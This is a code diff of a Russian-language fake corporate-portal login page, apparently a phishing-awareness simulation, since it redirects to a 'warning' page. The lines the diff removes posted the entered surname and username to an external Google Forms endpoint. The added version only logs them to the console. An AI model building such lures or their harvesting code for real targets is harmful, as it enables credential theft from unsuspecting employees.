@@ -1,22 +1,13 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-KQNV90TC0L"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'G-KQNV90TC0L');
-    </script>
-    
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Корпоративный портал | Вход в систему</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -26,59 +17,87 @@
         .login-container {
             background: white;
             padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            width: 350px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            width: 380px;
+            transition: transform 0.3s ease;
+        }
+        .login-container:hover {
+            transform: translateY(-5px);
         }
         .logo {
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
         .logo img {
-            width: 50px;
-            height: 50px;
+            width: 60px;
+            height: 60px;
+            border-radius: 8px;
         }
         h1 {
-            font-size: 22px;
-            color: #333;
+            font-size: 24px;
+            color: #2b2d42;
             text-align: center;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
         }
         .form-group {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
         label {
             display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-            color: #555;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #4a4a4a;
+            font-size: 14px;
         }
         input {
             width: 100%;
-            padding: 10px;
+            padding: 12px 15px;
             border: 1px solid #ddd;
-            border-radius: 4px;
+            border-radius: 8px;
             box-sizing: border-box;
+            font-size: 15px;
+            transition: all 0.3s ease;
+        }
+        input:focus {
+            border-color: #4361ee;
+            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
+            outline: none;
         }
         button {
             width: 100%;
-            padding: 12px;
-            background-color: #4285f4;
+            padding: 14px;
+            background-color: #4361ee;
             color: white;
             border: none;
-            border-radius: 4px;
-            font-weight: bold;
+            border-radius: 8px;
+            font-weight: 600;
             cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 16px;
             margin-top: 10px;
         }
         button:hover {
-            background-color: #3367d6;
+            background-color: #3a56d4;
+            transform: translateY(-2px);
+        }
+        button:active {
+            transform: translateY(0);
         }
         .footer {
             text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #777;
+            margin-top: 25px;
+            font-size: 13px;
+            color: #6c757d;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+            color: #4361ee;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -92,24 +111,26 @@
         <form id="loginForm">
             <div class="form-group">
                 <label for="lastname">Фамилия</label>
-                <input type="text" id="lastname" name="lastname" required>
+                <input type="text" id="lastname" name="lastname" required autocomplete="off">
             </div>
             
             <div class="form-group">
-                <label for="username">Имя пользователя</label>
-                <input type="text" id="username" name="username" required>
+                <label for="username">Корпоративный ID</label>
+                <input type="text" id="username" name="username" required autocomplete="off">
             </div>
             
             <div class="form-group">
-                <label for="password">Пароль</label>
-                <input type="password" id="password" name="password" placeholder="Необязательно">
+                <label for="password">Пароль (необязательно)</label>
+                <input type="password" id="password" name="password" placeholder="Введите для двухфакторной аутентификации" autocomplete="off">
             </div>
             
-            <button type="submit">Войти</button>
+            <button type="submit" id="submitBtn">Продолжить</button>
+            <div class="loading" id="loading">Проверка данных...</div>
         </form>
         
         <div class="footer">
-            © 2024 Корпоративная система. Все права защищены.
+            <p>© 2024 Корпоративные системы. Все права защищены.</p>
+            <p><a href="#" style="color: #4361ee; text-decoration: none;">Политика конфиденциальности</a></p>
         </div>
     </div>
 
@@ -117,36 +138,25 @@
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // Получаем только фамилию и логин
+            // Показываем индикатор загрузки
+            document.getElementById('submitBtn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            // Получаем данные
             const formData = {
-                lastname: document.getElementById('lastname').value,
-                username: document.getElementById('username').value
+                lastname: document.getElementById('lastname').value.trim(),
+                username: document.getElementById('username').value.trim(),
+                timestamp: new Date().toISOString()
             };
             
-            // Отправляем данные в Google Forms
-            fetch('https://docs.google.com/forms/d/1FAIpQLSfho5OP9VzQti4iS4pt5QNZSQYIogDzLvKi6etsmw5jiLJ04A/formResponse', {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: new URLSearchParams({
-                    'entry.1659127593': formData.lastname,  // ID поля для фамилии
-                    'entry.2121935433': formData.username   // ID поля для логина
-                })
-            })
+            // Логирование в консоль (для теста)
+            console.log('Собранные данные:', formData);
             
-
-            .then(() => {
-    setTimeout(() => {
-        window.location.href = 'warning.html';
-    }, 1000); // подождать 1 секунду
-})
-            .catch((error) => {
-                console.error('Ошибка:', error);
-                // Все равно перенаправляем, даже если отправка не удалась
-                window.location.href = 'warning.html';
-            });
+            // Имитация отправки с задержкой
+            setTimeout(() => {
+                // Перенаправление через 1.5 секунды
+                window.location.href = 'https://slonik-code.github.io/warning.html';
+            }, 1500);
         });
     </script>
 </body>
